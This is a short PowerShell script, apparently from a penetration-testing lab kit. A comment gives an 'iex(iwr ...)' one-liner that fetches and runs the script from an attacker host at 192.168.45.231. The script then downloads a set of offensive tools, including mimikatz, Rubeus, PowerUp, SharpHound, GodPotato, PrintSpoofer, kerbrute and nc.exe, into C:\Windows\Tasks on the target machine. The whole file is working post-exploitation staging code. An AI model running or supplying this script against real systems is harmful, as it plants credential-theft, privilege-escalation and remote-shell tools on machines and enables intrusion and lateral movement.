# type the following command in powershell to run the script
# iex(iwr -uri 192.168.45.231:8000/transfer_files.ps1 -usebasicparsing)

$baseUrl = "http://192.168.45.231/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "Rubeus.exe", "SharpHound.ps1", "mimikatz.exe", "winpeas.exe", "PrintSpoofer64.exe", "PsLoggedOn.exe", "kerbrute.exe", "agent.exe", "Invoke-RunasCs.ps1", "GodPotato-NET2.exe", "nc.exe")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}
